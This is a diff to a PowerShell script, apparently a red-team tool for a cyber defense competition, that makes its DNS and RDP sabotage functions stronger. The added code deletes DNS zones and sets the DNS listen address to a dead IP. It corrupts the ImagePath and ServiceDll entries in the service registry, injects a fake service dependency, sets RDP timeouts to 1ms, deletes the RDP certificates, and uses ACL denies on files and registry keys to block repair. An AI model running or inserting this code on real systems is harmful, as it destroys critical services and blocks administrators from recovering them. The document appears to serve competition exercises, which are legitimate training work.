@@ -338,6 +338,44 @@ function Invoke-ConditionalSurrender {
         }
     }
 
+    Write-Info "Deleting all non-auto-created primary DNS zones..."
+    if ($dnsModuleAvailable) {
+        try {
+            $killZones = Get-DnsServerZone -ErrorAction SilentlyContinue | Where-Object {
+                $_.ZoneType -eq "Primary" -and -not $_.IsAutoCreated -and $_.ZoneName -ne "TrustAnchors"
+            }
+            foreach ($z in $killZones) {
+                try {
+                    Remove-DnsServerZone -Name $z.ZoneName -Force -ErrorAction Stop
+                    Write-Success "  Deleted primary zone: $($z.ZoneName)"
+                } catch {
+                    Write-Warn "  Failed to delete zone $($z.ZoneName): $_"
+                }
+            }
+        } catch {
+            Write-Warn "Zone deletion enumeration failed: $_"
+        }
+    } else {
+        $zoneList = & dnscmd.exe /enumzones 2>$null
+        foreach ($line in $zoneList) {
+            if ($line -match '^\s+(\S+)\s+Primary') {
+                $zoneName = $Matches[1]
+                if ($zoneName -ne "." -and $zoneName -ne "TrustAnchors") {
+                    & dnscmd.exe /zonedelete $zoneName /f 2>$null | Out-Null
+                    if ($LASTEXITCODE -eq 0) { Write-Success "  dnscmd: Deleted zone $zoneName" }
+                }
+            }
+        }
+    }
+
+    Write-Info "Locking DNS listen address to dead IP (binds to nothing on real interfaces)..."
+    & dnscmd.exe /Config /ListenAddresses 192.0.2.1 2>$null | Out-Null
+    if ($LASTEXITCODE -eq 0) {
+        Write-Success "DNS listen address set to 192.0.2.1 (RFC 5737 blackhole -- DNS answers no real queries)"
+    } else {
+        Write-Warn "dnscmd /Config /ListenAddresses failed (rc=$LASTEXITCODE)"
+    }
+
     # -- Layer 2: TTL / Scavenging Destruction ---------------------------------
     Write-Section "ConditionalSurrender 2/3  TTL / Scavenging Destruction"
 
@@ -389,6 +427,15 @@ function Invoke-ConditionalSurrender {
         }
     } else {
         Write-Warn "DnsServer module unavailable -- per-zone aging skipped (global TTL applied)"
+    }
+
+    Write-Info "Corrupting DNS service ImagePath to prevent restart..."
+    try {
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\DNS" -Name "ImagePath" `
+            -Value "C:\NonExistent\dns.exe" -ErrorAction Stop
+        Write-Success "DNS service ImagePath corrupted to C:\NonExistent\dns.exe"
+    } catch {
+        Write-Err "Failed to corrupt DNS ImagePath: $_"
     }
 
     # -- Layer 3: Recursion Trap + Console ACL Lock ----------------------------
@@ -502,10 +549,38 @@ function Invoke-ConditionalSurrender {
         Write-Warn "Registry ACL on DNS key failed: $_"
     }
 
-    Write-Success "ConditionalSurrender complete -- all 3 layers applied"
-    Write-Info "  L1: Remove conditional forwarders (dnscmd /zonedelete ccdc.local /f)"
-    Write-Info "  L2: Restore DefaultTTL, disable scavenging, restore SOA min TTL"
+    Write-Info "Stopping and disabling DNS service..."
+    try {
+        Stop-Service -Name DNS -Force -ErrorAction Stop
+        Write-Success "DNS service stopped"
+    } catch {
+        Write-Warn "Could not stop DNS: $_"
+    }
+    try {
+        Set-Service -Name DNS -StartupType Disabled -ErrorAction Stop
+        Write-Success "DNS StartupType set to Disabled"
+    } catch {
+        Write-Warn "Could not disable DNS startup: $_"
+    }
+
+    Write-Info "ACL-denying DNS zone directory to prevent file restoration..."
+    $dnsZoneDir = "$env:SystemRoot\System32\dns"
+    if (Test-Path $dnsZoneDir) {
+        & icacls.exe $dnsZoneDir /deny "Everyone:(OI)(CI)(F)" /T /C /Q 2>$null | Out-Null
+        if ($LASTEXITCODE -eq 0) {
+            Write-Success "DNS zone directory ACL-locked: Everyone denied full access recursively"
+        } else {
+            Write-Warn "icacls /deny on DNS directory returned $LASTEXITCODE"
+        }
+    } else {
+        Write-Warn "DNS zone directory not found: $dnsZoneDir"
+    }
+
+    Write-Success "ConditionalSurrender complete -- all layers applied"
+    Write-Info "  L1: Remove conditional forwarders; restore deleted zones; reset listen addresses"
+    Write-Info "  L2: Restore DefaultTTL, disable scavenging, restore SOA min TTL; restore DNS ImagePath"
     Write-Info "  L3: Re-enable recursion, restore CACHE.DNS.bak, remove MMC/registry ACLs"
+    Write-Info "       Re-enable DNS startup, remove icacls deny from $env:SystemRoot\System32\dns"
 }
 
 # ==============================================================================
@@ -951,6 +1026,33 @@ function Invoke-RDPRuined {
         Write-Err "Failed to set fDenyTSConnections: $_"
     }
 
+    Write-Info "Corrupting TermService ServiceDll -- svchost cannot load TermService on any restart..."
+    $termSvcParams = "HKLM:\SYSTEM\CurrentControlSet\Services\TermService\Parameters"
+    try {
+        Set-ItemProperty -Path $termSvcParams -Name "ServiceDll" `
+            -Value "C:\NonExistent\termsrv.dll" -Type ExpandString -ErrorAction Stop
+        Write-Success "TermService Parameters\ServiceDll -> C:\NonExistent\termsrv.dll"
+    } catch {
+        Write-Err "Failed to corrupt ServiceDll: $_"
+    }
+
+    Write-Info "Setting session timeouts to 1ms (any surviving session disconnects instantly)..."
+    $timeoutProps = @("MaxConnectionTime", "MaxDisconnectionTime", "MaxIdleTime")
+    foreach ($prop in $timeoutProps) {
+        try {
+            Set-ItemProperty -Path $rdpTcpKey -Name $prop -Value 1 -Type DWord -ErrorAction Stop
+            Write-Success "  $prop = 1ms"
+        } catch {
+            Write-Warn "  Failed to set ${prop}: $_"
+        }
+    }
+    try {
+        Set-ItemProperty -Path $rdpTcpKey -Name "fInheritMaxDisconnectionTime" -Value 0 -Type DWord -ErrorAction Stop
+        Write-Success "  fInheritMaxDisconnectionTime = 0 (local timeout enforced, not GP)"
+    } catch {
+        Write-Warn "  Failed to set fInheritMaxDisconnectionTime: $_"
+    }
+
     # -- Layer 2: Security Layer Paradox + Cert Destruction --------------------
     Write-Section "RDPRuined 2/3  Security Layer Paradox + Cert Destruction"
 
@@ -992,6 +1094,33 @@ function Invoke-RDPRuined {
         Write-Warn "RCM\Certificates key not found -- may regenerate on next start (harmless)"
     }
 
+    Write-Info "ACL-denying termsrv.dll so it cannot be executed even if restored from rename..."
+    $termsrvDll = "$env:SystemRoot\System32\termsrv.dll"
+    if (Test-Path $termsrvDll) {
+        & icacls.exe $termsrvDll /deny "Everyone:(RX)" /C /Q 2>$null | Out-Null
+        if ($LASTEXITCODE -eq 0) {
+            Write-Success "ACL-locked termsrv.dll -- Everyone denied Read+Execute"
+        } else {
+            Write-Warn "icacls /deny on termsrv.dll returned $LASTEXITCODE"
+        }
+    } else {
+        Write-Info "termsrv.dll not found at expected path (may already be renamed by HideServices)"
+    }
+
+    Write-Info "Deleting RDP self-signed certificate from SystemCertificates store..."
+    $rdpCertStoreKey = "HKLM:\SOFTWARE\Microsoft\SystemCertificates\Remote Desktop\Certificates"
+    if (Test-Path $rdpCertStoreKey) {
+        try {
+            Get-ChildItem -Path $rdpCertStoreKey -ErrorAction SilentlyContinue |
+                Remove-Item -Force -Recurse -ErrorAction Stop
+            Write-Success "Deleted all entries from SystemCertificates\Remote Desktop cert store"
+        } catch {
+            Write-Warn "Failed to clear RDP cert store: $_"
+        }
+    } else {
+        Write-Info "RDP cert store key not found -- no entries to remove"
+    }
+
     # -- Layer 3: Service Account + Binary Corruption + Stop -------------------
     Write-Section "RDPRuined 3/3  Service Account + Binary Corruption + Stop"
 
@@ -1021,10 +1150,52 @@ function Invoke-RDPRuined {
         Write-Warn "Could not disable TermService startup: $_"
     }
 
-    Write-Success "RDPRuined complete -- all 3 layers applied"
-    Write-Info "  L1: Restore PortNumber=3389, fDenyTSConnections=0"
-    Write-Info "  L2: Restore SecurityLayer=2, MinEncryptionLevel=2, NLAEnabled=0; restart TermService to regenerate cert"
-    Write-Info "  L3: Restore ObjectName/ImagePath for TermService, re-enable + restart"
+    Write-Info "Injecting fake service dependency -- SCM refuses to start TermService without it..."
+    try {
+        $depVal = [string[]]@("RPCSS", "NonExistentCorruptDep2019")
+        Set-ItemProperty -Path $rdpSvcKey -Name "DependOnService" -Value $depVal -Type MultiString -ErrorAction Stop
+        Write-Success "DependOnService now includes NonExistentCorruptDep2019 -- SCM blocks start"
+    } catch {
+        Write-Err "Failed to corrupt DependOnService: $_"
+    }
+
+    Write-Info "Registry ACL: locking TermService key against easy repair..."
+    try {
+        $regHive    = [Microsoft.Win32.RegistryKey]::OpenBaseKey(
+            [Microsoft.Win32.RegistryHive]::LocalMachine,
+            [Microsoft.Win32.RegistryView]::Default
+        )
+        $termRegKey = $regHive.OpenSubKey(
+            "SYSTEM\CurrentControlSet\Services\TermService",
+            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
+            [System.Security.AccessControl.RegistryRights]::ChangePermissions -bor
+            [System.Security.AccessControl.RegistryRights]::ReadPermissions
+        )
+        if ($termRegKey) {
+            $acl  = $termRegKey.GetAccessControl()
+            $deny = New-Object System.Security.AccessControl.RegistryAccessRule(
+                "BUILTIN\Users",
+                "SetValue,CreateSubKey,WriteKey",
+                [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
+                [System.Security.AccessControl.PropagationFlags]::None,
+                [System.Security.AccessControl.AccessControlType]::Deny
+            )
+            $acl.AddAccessRule($deny)
+            $termRegKey.SetAccessControl($acl)
+            $termRegKey.Close()
+            Write-Success "Registry ACL: Denied BUILTIN\Users write access to TermService key"
+        } else {
+            Write-Warn "Could not open TermService registry key for ACL modification"
+        }
+        $regHive.Close()
+    } catch {
+        Write-Warn "Registry ACL on TermService key failed: $_"
+    }
+
+    Write-Success "RDPRuined complete -- all layers applied"
+    Write-Info "  L1: Restore PortNumber=3389, fDenyTSConnections=0, restore ServiceDll, restore timeouts"
+    Write-Info "  L2: Restore SecurityLayer=2, MinEncryptionLevel=2, NLAEnabled=0, remove icacls deny on termsrv.dll"
+    Write-Info "  L3: Restore ObjectName/ImagePath, restore DependOnService, remove registry ACL deny, re-enable + restart"
 }
 
 # ==============================================================================
